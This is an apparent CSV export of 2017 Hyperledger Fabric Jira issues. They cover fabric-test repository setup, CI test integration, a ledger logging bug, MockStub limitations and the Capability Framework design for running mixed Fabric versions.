Currently, the Makefile makes some assumptions that the directory structure will be ""hyperledger/fabric/..."" The Makefile should be more flexible to allow for a different structure.",,ChristopherFerris,latitiah,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5571,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzya6v:",,,,,,Sprint 19 - Quality,,,,,1.0,,,,,,,,,,,,ChristopherFerris,latitiah,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"31/Jul/17 11:37 PM;latitiah;[~rameshthoomu] [~ryjones] [~ChristopherFerris] [~mastersingh24] [~greg.haskins]: I would like your opinion on this issue. (Feel free to add others as you see fit.)

I am proposing a simple fix of changing the Makefile variable PROJECT_NAME to use ""hyperledger/fabric"" as the default if the PROJECT_NAME env variable is not set and using ""$(PROJECT_NAME)/fabric"" if it is set.
;;;","01/Aug/17 2:15 AM;ChristopherFerris;my preference would be that the fabric-test integration tests not build new artifacts but leverage previous builds (possibly stored on nexus);;;","01/Aug/17 2:53 AM;latitiah;The problem with that is that we would have to wait for a build to be deployed to an external location and not be able to build based on a set commit in fabric. Performing this task will allow us to be able to freely test against a specific sha at any given time. Especially if we are running daily test, we should be able to build accordingly.

Including fabric as a submodule allows the use of existing chaincodes and other tools in the fabric repo. If we are doing this, why would we not also _allow_ for the building of the fabric images? It is not vital to build from this location. We should be able to use whatever images are made available. But making this change allows for more flexibility in testing and what can be tested at a given snapshot in the development cycle.
;;;","03/Nov/17 4:08 AM;mastersingh24;I don't really like the use of submodules in general - I feel like you can just have a script which pulls the right commit, etc.  Just my opinion tho;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Setup the new fabric-test repo to be in a useful state,FAB-5546,19622,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,scottz,latitiah,latitiah,01/Aug/17 12:44 AM,21/Jul/18 3:47 AM,28/Oct/23 3:00 AM,18/Nov/17 9:28 AM,,,,,,fabric-quality,,,,,,0,,,,,,,"In many of the test files that are imported from the fabric repository in the hyperledger/fabric/test path, there are references to ""github.com/hyperledger/fabric"" but as we are using fabric as a submodule in the fabric-test repository, we need to update the test tools and scripts accordingly. 

There are multiple README files in the different directories under this repo, but no overall README. ",,latitiah,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5430,,,,FAB-5384,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzya73:",,,,Unset,,Sprint 19 - Quality,,,,,,Unset,,,,,,,,,,,latitiah,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,release-2.4,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,true,"18/Nov/17 9:27 AM;scottz;all subtasks are done. future enhancements will be made with newer jiras and CRs.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
CI updates to use fabric-test repo,FAB-5547,19623,19622,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,rameshthoomu,latitiah,latitiah,01/Aug/17 12:46 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,09/Oct/17 11:07 PM,,,,,,fabric-build,fabric-ci,,,,,0,,,,,,,"Fix test suites job scripts.

Adjust pathnames as needed, to use fabric-test repo instead of fabric.

This can be done after others fix their specific tests to run smoothly in the new repo, including updating the automation scripts such as *runDailyTestSuite.sh*",,latitiah,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzya7b:",,,,,,Sprint 19 - Quality,,,,,,,,,,,,,,,,,latitiah,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"01/Aug/17 11:45 PM;rameshthoomu;fabric-test repository is not ready with test scripts.. Once test scripts are ready will integrate them in CI.;;;","31/Aug/17 12:29 AM;latitiah;There are 11 behave tests that can be executed when merging CRs by running `behave -t smoke`.
There are also 43 behave tests that can be executed during daily test runs by executing `behave -t daily`.

Auction tests have been integrated as well, but I'm not sure that they are ready to be used during daily run tests. [~sandp125] can speak on this more.;;;","08/Sep/17 11:00 PM;rameshthoomu;I see dailytests (ledger) tests are failing with the patch mismatches.. I think this has to be fixed in fabric-test repository.

Able to run behave (smoke and daily) tests. Tested in Jenkins sandbox and observed one of the daily test case is failing and smoke tests are working as expected.;;;","09/Oct/17 11:07 PM;rameshthoomu;fix has been submitted and merged week back. Now for every patch set we run set of smoke tests and update the result back to Gerrit patch set. Also, there is a cron job which executes all the daily tests for 7-8 hours. See the daily test result here https://jenkins.hyperledger.org/view/fabric-test/job/fabric-test-daily-x86_64/test_results_analyzer/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
LTE tool to use the new fabric-test directory structure,FAB-5548,19624,19622,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,AdnanChoudhury,latitiah,latitiah,01/Aug/17 12:47 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,28/Nov/17 12:55 AM,,,,,,,,,,,,0,,,,,,,,,AdnanChoudhury,latitiah,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzya7j:",,,,,,Sprint 19 - Quality,,,,,,,,,,,,,,,,,AdnanChoudhury,latitiah,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,true,"17/Nov/17 9:35 PM;scottz;Have we decided to use workaround (moving code to build and run it) and abandoned this effort? The LTE tests are running in CI already. Let's disucss, if necessary.;;;","18/Nov/17 1:49 AM;AdnanChoudhury;The decision is to not go down the vendoring path and copy the LTE code every time to Fabric and run it from there. ;;;","28/Nov/17 12:55 AM;AdnanChoudhury;https://gerrit.hyperledger.org/r/#/c/15639/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Auction Chaincode: update to use the fabric-test directory structure,FAB-5549,19625,19622,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,sandp125,latitiah,latitiah,01/Aug/17 12:48 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,17/Nov/17 9:33 PM,,,,,,,,,,,,0,,,,,,,,,latitiah,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzya7r:",,,,,,Sprint 19 - Quality,,,,,,,,,,,,,,,,,latitiah,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"11/Aug/17 10:56 PM;latitiah;Failures:
testAuctionChaincode.py::ChaincodeAPI::test_FAB3934_1_Create_Channel PASSED
testAuctionChaincode.py::ChaincodeAPI::test_FAB3934_2_Join_Channel PASSED
testAuctionChaincode.py::ChaincodeAPI::test_FAB3934_3_Install_Chaincode FAILED
testAuctionChaincode.py::ChaincodeAPI::test_FAB3934_4_Instantiate_Chaincode FAILED
testAuctionChaincode.py::ChaincodeAPI::test_FAB3934_5_Post_Users FAILED
testAuctionChaincode.py::ChaincodeAPI::test_FAB3934_6_Get_Users FAILED
testAuctionChaincode.py::ChaincodeAPI::test_FAB3934_7_Download_Images FAILED
testAuctionChaincode.py::ChaincodeAPI::test_FAB3934_8_Post_Items FAILED
testAuctionChaincode.py::ChaincodeAPI::test_FAB3934_9_Auction_Invoke FAILED

Install error:
Error: Error getting chaincode code chaincode: path to chaincode does not exist: github.com/hyperledger/fabric/test/chaincodes/AuctionApp

Instantiation error:
Error: Error endorsing chaincode: rpc error: code = Unknown desc = chaincode error (status: 500, message: cannot get package for the chaincode to be instantiated (auctioncc0:1)-open /var/hyperledger/production/chaincodes/auctioncc0.1: no such file or directory);;;","17/Nov/17 9:33 PM;scottz;We abandoned this, in favor of using marbles and other chaincodes.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Move configtxgen to protolator,FAB-5550,19626,19557,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,01/Aug/17 1:09 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,30/Jan/18 12:15 AM,,,,,,fabric-tools,,,,,,0,configtxgen,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzya7z:",,,,,,,,,,,,,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
No log is generated in the event of inability to write to peer-ledger file,FAB-5551,19627,,Bug,Closed,FAB,Fabric,software,denyeart,,,Low,Done,manish-sethi,AdnanChoudhury,AdnanChoudhury,01/Aug/17 1:43 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,21/Oct/17 1:42 AM,v1.0.0,,,,,fabric-ledger,,,,,,0,ledger,quality,Usability,,,,"The peer-ledger is saved in the file named `blockfile_XXXXX`. In the event that the file become unwritable (e.g. accidentally deleted by some other process), none of the subsequent transactions result in any error/warning log even though the the TXs are not being written in the file anymore.

Expectation: if peer fails to record the TXs in the ledger, it indicates the error somehow, possibly via the logs. The network operators need to be made aware of the error and if any manual recovery actions are necessary.",,AdnanChoudhury,denyeart,manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzya87:",,,,,,,,,,,,,,,,,,,,,,,AdnanChoudhury,denyeart,manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"24/Aug/17 10:50 PM;denyeart;[~manish-sethi] Could you take a look and get with Adnan as needed?;;;","19/Oct/17 3:04 AM;manish-sethi;[~AdnanChoudhury] - as discussed sometime ago, if someone has access to the file system and deletes the file to which the ledger is writing the blocks, this is the default behavior of most of the common filesystems.

The process that is writing to a file won't notice a delete from outside. For the writing process (peer process - in this case), the file still exists and it can keep writing as long it has the open file descriptor.

Think it from other perspective, someone can delete the already written files as well. It's is similar to deleting some of the files from the directory of a database. Mostly, dbs would figure this out when either you run some sanity checker tools or those files are read during query execution.

So, I would suggest that if the files are getting generated with the right permission (e.g., no read/write/delete allowed to the user/group other than the one who can manage peer process/machine - we should be fine.

 ;;;","20/Oct/17 3:26 AM;AdnanChoudhury;Thanks [~manish-sethi]. In the writing process, is there any manual flushing? A flushing event should detect the problem of a orphan file descriptor, is this assumption correct?;;;","21/Oct/17 1:42 AM;AdnanChoudhury;As [~manish-sethi] clarified, the flushing is happening after every block, and the files are generated with write permission, and the OS is handling the file-descriptor, the ledger behavior can be considered as ""as expected"". Marking this as *Not a bug*  ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix TODOs in msgprocessor,FAB-5552,19628,19176,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,01/Aug/17 1:54 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,05/Aug/17 8:47 PM,,,,v1.1.0,,fabric-orderer,,,,,,0,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzya8f:",,,,,,,,,,,,,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
MockStub cannot support inter-chaincode invocation,FAB-5554,19631,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,ShermanHLee,ShermanHLee,01/Aug/17 3:18 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,11/Feb/18 7:01 AM,v1.0.0-rc1,,,,,fabric-peer,,,,,,0,Golang,test,,,,,"Unable to locally perform unit-test for developer's own chaincode with 
{code:java}
// go test{code}
Chaincode dependencies being vendored in separate folders do not allow cross-referencing in import statements as done in example05.

[https://stackoverflow.com/questions/45196860/hyperledger-fabric-unit-test-cross-chaincode-invocation-without-collapsing-vendo]",,muralisr,ShermanHLee,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzya93:",,,,,,,,,,,,,,,,,,,,,,,muralisr,ShermanHLee,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"08/Sep/17 5:28 AM;muralisr;Based on the discussion in stackoverflow vendoring the shim in two chaincode packages has you dealing with two types. This is not something we can fix by a change to the Mock chaincode system (better fixed with doing some common vendoring in your code, Id think). Lowering the priority.;;;","31/Jan/18 8:23 AM;muralisr;[~ShermanHLee] Not sure if this is still an issue but as discussed in the stackoverflow, this has to be handled by some approach that relies on common vendoring. Can we close this ?;;;","08/Feb/18 4:03 AM;Clayton Sims;Moving to Monitor /Hold until we hear back from Sherman. [~ShermanHLee] ?;;;","10/Feb/18 4:21 AM;Clayton Sims;[~ShermanHLee]  any updates?;;;","10/Feb/18 6:39 AM;ShermanHLee;[~Clayton Sims] the workaround is still the same as [~muralisr] mentioned earlier;;;","10/Feb/18 6:55 AM;Clayton Sims;Murali is asking if this can be closed?;;;","11/Feb/18 6:56 AM;ShermanHLee;[~Clayton Sims] Yes I think so;;;","11/Feb/18 7:00 AM;muralisr;Thanks [~ShermanHLee]., closing it.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Capability Framework - I want to support a mix of Fabric release levels in the network. I should be able to enable new (incompatible) capabilities on the channel when I am ready (older incompatible peers/orderers should drop out of channel),FAB-5556,19633,,Story,Closed,FAB,Fabric,software,denyeart,,,Highest,Done,jyellick,binhn,binhn,01/Aug/17 5:39 AM,21/Jul/18 3:48 AM,28/Oct/23 3:00 AM,09/Jan/18 1:28 AM,v1.0.0,,,v1.1.0,,fabric-release,,,,,,9,,,,,,,"As a Fabric network provider, I might have multiple versions of Fabric components running together on the same blockchain network. For example, 1 possible combination Orderer v1.0, Peer v1.1, SDK v1.1, and CA v1.0. There are potentially many different combinations with each participating org.

Compatibility generally, is assured by the usage of protobufs and general good practice of not making breaking API/ABI changes. Although all changes should strive to be backwards compatible, some changes necessarily are not. Consider for instance the change in the chaincode shim for to require mutual TLS for chaincode execution. This change breaks existing deployed chaincodes, but is a good requirement for security reasons. For the mutual TLS change, and others like it, the implication is that something in the system stops working, but there is no potential that the system becomes 'incorrect'. For these sorts of changes, the change should be linked to --FAB-6000-- a sub-task of this issue, so that they can be noted and documented.

There is a second class of non-backwards compatible changes which have the ability not only to make the system stop working, but also to make the system incorrect. Consider for instance the new MSP roles of Peer, Orderer, and Client. A v1.0 peer does not understand these roles, so would always evaluate policies involving them to false, while a v1.1 peer might evaluate them to true. This could cause a fork in the state database, which could be used to facilitate a double spending attack. For this feature, and others like it, they should be linked to --FAB-5999-- to ensure that all parts of the system choose to use either the same legacy v1.0 behavior, or, that all parts of the system choose to use the new v1.1 behavior (precluding the ability for v1.0 code to participate.)
----
*Capabilties Framework*

This issue is focused on this second class of non-backwards compatible and potentially non-deterministic changes, and is resolved through the new 'Capabilities Framework'.

The 'Capabilities Framework' is a rather grand sounding term for a very simple idea. The channel config already declares the rules which allow deterministic validation of transactions (the MSP definitions and policies), so it is natural to extend this config to also specify what code levels are required to correctly parse a channel. The extension is accomplished by adding a new config value which defines a capabilities map. This map contains string keys corresponding to features required to properly participate in the channel. If a binary does not support these features, then it cannot participate in the channel.

For simplicity, in v1.1 if a binary cannot participate in a channel, it should simply crash. Although this is perhaps inelegant, it is obviously correct from a data integrity/safety perspective, and gives a clear sign to administrators that something is going wrong. In the future we may wish to introduce a more graceful mechanism, but it is not a requirement for v1.1.

You may have noticed that the above paragraphs are deliberately vague about 'the binary', because not all binaries must necessarily support all capabilities. Consider a v1.2 peer built with side DB support. Because the side DB usage changes nothing about the peer's interaction with the orderer, it should be possible to require that the peer network be at v1.2, without requiring that the ordering network be at v1.2 as well. Because of this, in the channel config, the capabilties are split into three maps. One at the root channel level which indicates capabilities that both the orderer and peer must support (for instance signature algorithms, or policy types), one at the application level which indicates capabilities that the peer must support (for example, side DB), and one at the orderer which indicates capabilities the orderer must support (for example, SBFT). These three maps have no direct relation to eachother, but an orderer must support the orderer and channel capabilities, while the peer must support the peer and channel capabiltieis.

For v1.1, and in general, we should strive not to proliferate capabilities. To avoid this proliferation (and the corresponding nightmare of support matrices) we introduce only a single capability at each of the three capabilities maps for v1.1. This capability is the ""V1.1"" capability, and all non-compatible changes will be encapsulated by it. The intention is that for v1.2, there will be a new ""V1.2"" capability flag which will imply a superset of the ""V1.1"" capabilities flags. Until we discover a pressing need for a capability which is not tied to version, capabilities can be thought of merely as a way to specify operational version of a channel. However, for the future, the ability for more complex capabilities schemes is possible.
----
*Upgrade in operation*

For a typical upgrade scenario, first, all binaries in the network should be upgraded to v1.1. This may be done in a rolling incremental fashion, and the network should continue to operate normally during this time. Once the entire network has been upgraded, the admins send a reconfiguration transaction to every channel in the network (including the ordering system channel) which sets the v1.1 capability in each of the three maps. This may also be done in a rolling way across channels. As each reconfiguration commits, that channel will now begin validating transactions according to the new v1.1 semantics, and any rogue peers which were not upgraded to v1.1 will crash.

Note, it is important that all orderers are upgraded to v1.1 before enabling capabilities. Failing to do so will result in a fork of the blockchain. The v1.1 orderers will enforce that capabilties are turned on at the orderer group prior to allowing the application group to enable them to prevent the application admins from accidentally creating this fork. Note, this is only a requirement for the initial upgrade to v1.1, in the v1.2 upgrade scenario, the down-leveled orderers would simply crash on reconfiguration, rather than fork.
----
*Using capabilities*

See:
 [https://gerrit.hyperledger.org/r/#/c/14267/] <- Example /Channel/Application capability
 [https://gerrit.hyperledger.org/r/#/c/14265/] <- Example /Channel capability
 [https://gerrit.hyperledger.org/r/#/c/13263/] <- Example /Channe/Orderer capability

The above examples are probably the best way to understand how to use capabilities, but there is some documentation below which will hopefully clarify the process for anyone making a change requiring the capabilities framework. The process is as follows:

1.Verify that the change is not backwards compatible and causes non-determinism in a transaction validation path (usually either for the orderers transaction-filtering, or for the peers VSCC transaction validation in the commit phase).
 2. Identify whether this behavior affects only the orderer, the peer, or both. The capability must then be defined as an orderer, application, or channel capability respectively. Refer to this as the {{<component>}} hereafter.
 3. Modify the {{<component>Capabilities}} interface in {{fabric/common/channelconfig/api.go}} to define a switch for the new behavior. This should be sensibly named so that the calling code reads naturally. For instance, fixing a bug in the orderer channel creation code was named {{SetChannelModPolicyDuringCreate() bool}}. This separates knowledge of the capabilities implementation from the consuming component and allows for modification of the capabilities framework without disturbing other code.
 4. Pick a new, or more often existing capability string defined in {{fabric/common/capabilities/<component>.go}} and have whether it is set control the return of the method defined in (3). Usually, capabilities are tied to version, so, for instance the {{""V1.1""}} capability for the orderer will cause {{SetChannelModPolicyDuringCreate()}} to return true. For v1.2, the capabilities framework will also make the {{""V1.2""}} capability cause {{SetChannelModPolicyDuringCreate()}} to return true. In this way, the consumer of {{SetChannelModPolicyDuringCreate}} does not need to perform version based logic for its behavior.
----
Original design doc: [https://docs.google.com/document/d/1CbB8dR0GNnHi7UekIDpsySCBXkPTtKk0m53CIzJbU-A/edit?usp=sharing]

 ",,angelo.decaro,binhn,caoyu,ChristopherFerris,daijianw,denyeart,greg.haskins,guoger,JonathanLevi,jyellick,kchristidis,MichaelWang,peoplehlj,rickr,troyronda,wutongtree,yacovm,yoheiueda,zhaochy,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-4203,FABN-808,FAB-3678,FAB-6446,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-6122,,,,,,,,,"1|hzya9j:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,angelo.decaro,binhn,caoyu,ChristopherFerris,daijianw,denyeart,greg.haskins,guoger,JonathanLevi,jyellick,kchristidis,MichaelWang,peoplehlj,rickr,troyronda,wutongtree,yacovm,yoheiueda,zhaochy,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"03/Aug/17 10:06 AM;angelo.decaro;[~binhn], I added Section 2.6 to describe possible incompatibility issues with the MSP related to the support of RSA public keys/signatures.;;;","12/Aug/17 3:39 AM;jyellick;I think the creation of these sub-tasks is extremely premature.

I am usually a relentless optimist with regards to what we can accomplish in code in a short period of time, but the idea that in 3 weeks, we will have a real, no-holes solution to supporting a mixed-mode v1.0/v1.1 network seems incredibly low, bordering on laughable.

This is a truly hard problem.  We need not only for the system to work in the green path, but we also need to analyze all of the error cases, and all of the attack cases.

Designing the original set of messages took months of effort, and we still found ourselves making necessary last minute changes.  I do not see how we hope to  change these structures to make a true mixed-mode network possible in this short  of a timeframe.

Consider the simple question of ""Add Version to the Block"".  How does this work? Is the version part of the hash chain? If so, then v1.0 clients cannot compute the hash chain correctly without viewing this field.  If not, what are the security implications of someone being able to modify the version field without breaking the hash chain?  What about the signatures over the metadata which are built on the block header hash? If not in the hash chain, then the version is not signed over, what are the implications of that? What should a peer do when they receive a block of a higher version? Do they retry forever for a block of the current version, or do they give up on the channel until restart?

These are some questions off the top of my head for one version field in one message.  If we cannot immediately answer all of them confidently, IMO we have no business attempting to modify the message to include this field.

As I see it, the best we can do, is to say: ""These features are new in v1.1, and we do not support running mixed mode if they are utilized.  Otherwise all changes are backwards compatible.""  I think it would be a good idea to backport a fix to 1.0.x to enforce that a v1.0 peer or orderer will not process transactions with a v1.1 channel header.  I'm very wary of us getting any solution which is more complicated done right in 3 weeks.;;;","12/Aug/17 4:16 AM;yacovm;I agree with Jason on the complexity of the matter and I personally think that the design doc linked should be more elaborate and contain exactly the scenarios and possibilities of what happens if component X from V1.0 comes with interaction with component X from V1.1
Also - we need to keep in mind that we have a 3-tier architecture (clients, orderers, peers) and entities travel between them, etc.;;;","12/Aug/17 5:20 AM;binhn;[~jyellick] [~yacovm]

The document has been and still is open for edit – a whole paragraph right at the beginning telling readers that, and it requires all to contribute. It is not a 1 person effort to work this out. Please spend your valuable time on capturing the thoughts on the design document.

